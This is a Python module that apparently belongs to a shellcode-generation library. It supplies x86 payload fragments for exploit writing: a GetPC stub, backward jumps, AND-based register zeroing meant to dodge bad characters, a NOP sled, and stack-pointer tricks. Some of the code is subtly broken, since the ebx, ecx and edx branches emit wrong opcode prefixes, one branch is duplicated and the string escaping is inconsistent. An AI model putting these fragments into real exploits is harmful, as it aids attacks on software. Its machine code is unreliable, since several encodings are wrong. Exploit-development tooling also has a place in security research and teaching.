import secrets
from shellerate.math import *;

def get_where_am_i_in_ecx():
    # fldz
    # fnstenv [esp-12]
    # pop ecx
    # add cl, 9
    return "\xd9\xee\xd9\x74\x24\xf4\x59\x80\xc1\x09"

# jumps is how many 256 bytes backword jump you want to take
def jmp_backwards_ecx(jumps=1):
    return get_where_am_i_in_ecx() + "\xfe\xcd" * jumps + "\xff\xe1"

def zero_eax():
  """
    Creates a shellcode that set the EAX register 0 using two AND instructions.

    If you look at the binary representation you can understand why these two
    ANDs will set EAX to 0 whatever the starting value.

    AND EAX, 0x554e4d4a
    AND EAX, 0x2a313235
  """
  return "\\x25\\x4A\\x4D\\x4E\\x55\\x25\\x35\\x32\\x31\\x2A"

def zero_with_and(reg="eax", badchar=[]):

  while True:
    first_and = secrets.token_hex(4)
    n_b = bin(int(first_and, 16))
    n_b_2 = bit_not(int(n_b, 2), 32)
    if n_b_2 > 0:
      break

  second_and = format(n_b_2, 'x').zfill(8)

  logging.debug("First AND: %s" % first_and)
  logging.debug("Second AND: %s" % second_and)

  first_and_hex = strings.from_string_to_payload(strings.swap(first_and))
  second_and_hex = strings.from_string_to_payload(strings.swap(second_and))

  if reg == "eax":
    return "\\x25"+first_and_hex+"\\x25"+second_and_hex

  if reg == "ebx":
    return "\\xb1\\xe3"+first_and_hex+"\\xb1\\xe3"+second_and_hex
  if reg == "ebx":
    return "\\xb1\\xe3"+first_and_hex+"\\xb1\\xe3"+second_and_hex
  if reg == "ecx":
    return "\\xb1\\xe1"+first_and_hex+"\\xb1\\xe1"+second_and_hex
  if reg == "edx":
    return "\\xb1\\xe2"+first_and_hex+"\\xb1\\xe2"+second_and_hex

def nop_sled(count=1):
    return "\\x90"*count

def get_esp_address_in_eax():
  # PUSH ESP
  # POP EAX
  return "\\x54\\x58"
